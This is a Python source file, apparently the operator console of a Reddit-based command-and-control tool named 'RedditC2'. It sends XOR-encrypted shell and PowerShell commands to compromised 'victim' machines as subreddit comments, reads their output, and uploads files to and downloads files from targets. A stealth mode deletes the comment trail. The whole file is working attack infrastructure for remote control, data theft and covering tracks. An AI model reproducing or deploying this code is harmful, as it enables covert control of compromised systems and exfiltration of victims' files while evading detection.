import praw
import random
import string
import time
import os
import json
import platform
from prawcore import NotFound
from praw.models import InlineImage
from encryption import *
from banner import *
import autocomplete
import readline

comp = autocomplete.Completer()
# we want to treat '/' as part of a word, so override the delimiters
readline.set_completer_delims(' \t\n;')
readline.parse_and_bind("tab: complete")
readline.set_completer(comp.complete)

#define the host's OS
hostOS = platform.system()        

#Function to convert base64 to file
def base64_to_file(base64_string, filename):
    # decode the base64 string
    decoded_data = base64.b64decode(base64_string).decode('utf-8')
    # write the data to the file
    with open(filename, 'wb') as f:
        f.write(decoded_data.encode())

#Function to encode a file to base64
def encode_file_in_base64(filepath):
    with open(filepath, 'rb') as file:
        file_data = file.read()
    return base64.b64encode(file_data).decode('utf-8')

#list all listeners (all post titles in a specific Subreddit)
def listListeners(subreddit_name):
    subreddit = reddit.subreddit(subreddit_name)

    # Print the titles of all posts
    for post in subreddit.hot(limit=None):
        print("[*] " + post.title)
	
#post into the subreddit
def createPost(subreddit_name, title):
    postContent = "" #add a post content if you don't want to leave the post body empty
    # get subreddit
    subreddit = reddit.subreddit(subreddit_name)
    #create a post
    subreddit.submit(title,selftext=postContent)

def verifySession(subreddit_name, listenerID):
    value = True
    for submission in reddit.subreddit(subreddit_name).top('all'):
        if(submission.title == listenerID):
            value = True
            break
        else:
            value = False
    return value
    
def sub_exists(sub):
    exists = True
    try:
        reddit.subreddits.search_by_name(sub, exact=True)
    except NotFound:
        exists = False
    return exists

#delete all the comments in a subreddit post, leaving no trace
def deleteComments(subreddit_name, title):
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(title,limit=10)
    
    for submission in resp:        
        submission.comments.replace_more(limit=None)
        for comment in submission.comments:
            if("executed" in comment.body):
                #delete the replies (victim's posts)
                for outputTask in comment.replies:
                    outputTask.delete()
                #delete the replies (attacker's posts)
                comment.delete()
            else:
                pass
            
    print("[+] Comments got deleted")


#read a post with a specific title
def readOutput(subreddit_name, title, command):
    victim_responses = []
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(title,limit=10)

    for submission in resp:        
        #look only for comments which has our command in it
        submission.comments.replace_more(limit=None)
        for top_level_comment in submission.comments:
            if(command in top_level_comment.body):
                #ignore the already executed commands
                if top_level_comment.body == "executed":
                    pass
                    
                #now read the below comment, which is the output result
                else:                    
                    for outputTask in top_level_comment.replies:
                        victim_responses.append(outputTask.body)
                        
                    #only edit the reply to "executed" if it has replies in it
                    if (top_level_comment.replies):
                        top_level_comment.edit("executed")
        
        #use recursion when no new reply is found
        if not victim_responses:
            #print("[!] No response, waiting for 5 seconds")
            #time.sleep(5)
            return readOutput(subreddit_name, title, command)
        
        else:
            response = victim_responses[0]
            response = response[7:]
            response = response[:-1]
            
            #decode and decrypt the message
            decipher = decrypt(str(response), xor_key)
            
            if("download" in decipher):
                pass
            else:
                print("[+] Received Output:\n" + str(decipher))
            
    return str(decipher)

def sendCommand(subreddit_name, title, command):
    subreddit = reddit.subreddit(subreddit_name)
    resp = subreddit.search(title,limit=10)
    
    for submission in resp:
        submission.reply("in: " + command)
        

if __name__ == "__main__":
    #print the banner
    print(banner)
    
    #retrieve the data from the configuration file
    with open ("config.json", "r") as configFile:
        data = json.load(configFile)

    client_id = data['client_id']
    client_secret = data['client_secret']
    username = data['username']
    password = data['password']
    user_agent = data['user_agent']
    stealth_mode = data['stealth_mode']
    xor_key = data['xor_key']
    #-------------
    subreddit_name = ""
    #-------------

    # creating an authorized reddit instance
    reddit = praw.Reddit(client_id = client_id,
                     client_secret = client_secret,
                     username = username,
                     password = password,
                     user_agent = user_agent)
                     
    reddit.validate_on_submit = True
    
    while True:
        command = input("RedditC2> ")
        if command[:13] == "set subreddit":
            #validate the subreddit
            if(sub_exists(command[14:])):
                print("[*] Subreddit set to: " + command[14:])
                subreddit_name = command[14:]
            else:
                print("[-] The selected subreddit doesn't exist or doesn't have propper permissions. Try again with another subreddit.")

        #list all listeners the operator can use
        elif command[:14] == "list listeners":
            if(subreddit_name == ""):
                print("[!] Put the value of subreddit")
            else:
                listListeners(subreddit_name)

        #careful, only execute this once
        elif command[:15] == "create listener":
            listener_id = command[16:]
            if(subreddit_name == ""):
                print("[!] Put the value of subreddit")
            else:
                createPost(subreddit_name, listener_id)
                print("[+] Listener created")

        elif command[:12] == "use listener":
            if(subreddit_name == ""):
                print("[!] Put the value of subreddit")
            else:
                selected_listener = command[13:]
                if(verifySession(subreddit_name, selected_listener)):
                    print("[+] Entered the session")

                    while True:
                        session_command = input(selected_listener + "> ")

                        #------------------------ ALL AGENT FEATURES START HERE ------------------------
                        if(session_command == "exit"):
                            deleteConfirm = input("[?] Do you want to delete all the C2 traffic logs stored in Reddit before exiting? [Y/n]: ")
                            if(deleteConfirm == "y" or deleteConfirm == "Y"):
                                print("[*] Deleting comments...")
                                deleteComments(subreddit_name, selected_listener)
                                break
                            else:
                                break
                    
                        elif(session_command == "clear"):
                            if (hostOS == "Linux"):
                                os.system('clear')
                            elif (hostOS == "Windows"):
                                os.system('cls')
                    
                        else:
                            if(session_command[:8] == "download"):
                                filename = session_command[9:] #save the file that user entered
                                
                            if(session_command[:6] == "upload"):
                                filename = session_command[7:] #save the file that user entered
                                session_command = "upload " + filename + " " + encode_file_in_base64(filename)
                                if(len(session_command) > 10000):
                                    print("[!] File is too large (" + str(len(session_command)) + "/10000 available characters)")
                                    break
                                else:
                                    print("[+] Uploading " + filename + " to the target")
                                
                            
                            final_message = encrypt(session_command, xor_key)
                                          
                            #send the command
                            sendCommand(subreddit_name, selected_listener, str(final_message))
                            print("[+] Command sent")
                            #then read the output
                            #time.sleep(1) #give time for reddit to update
                            
                            if(session_command[:8] == "download"):
                                fileContent = readOutput(subreddit_name, selected_listener, str(final_message))
                                if("File is too large" in fileContent):
                                    pass
                                else:
                                    base64_to_file(fileContent, "downloads/" + filename)
                                    print("[+] File saved as " + filename)
                                
                            else:
                                readOutput(subreddit_name, selected_listener, str(final_message))
                            
                            
                            #delete the comments if stealth_mode is set to 1 in config.json
                            if(stealth_mode == "1"):
                                deleteComments(subreddit_name, selected_listener)
                            else:
                                pass
                                
                                
                        #------------------------ AGENT FEATURES END HERE ------------------------
                else:
                    print("[!] Could not enter the session")


        elif command == 'clear':
            if (hostOS == "Linux"):
                os.system('clear')
            elif (hostOS == "Windows"):
                os.system('cls')
            
        elif command == 'exit':
            print("[*] Exiting")
            exit()

        elif command == 'help':
            print("""
set subreddit                    --> Select the subreddit where you will create the listener
list listeners                   --> List all listeners you can use within the subreddit
create listener [session number] --> Create a post in subreddit where the traffic will ocurr
use listener [session number]    --> Interact With Each Session Individually
run [command]                    --> Execute a cmd command
download [file_name]             --> Download a file from the target
upload [file_name]               --> Upload a file to the target
powershell [command]             --> Execute a powershell command
help                             --> Show the help menu
exit                             --> Exit from the session
clear                            --> Clear the screen
                """)

        else:
            print("[-] Command Not Found")
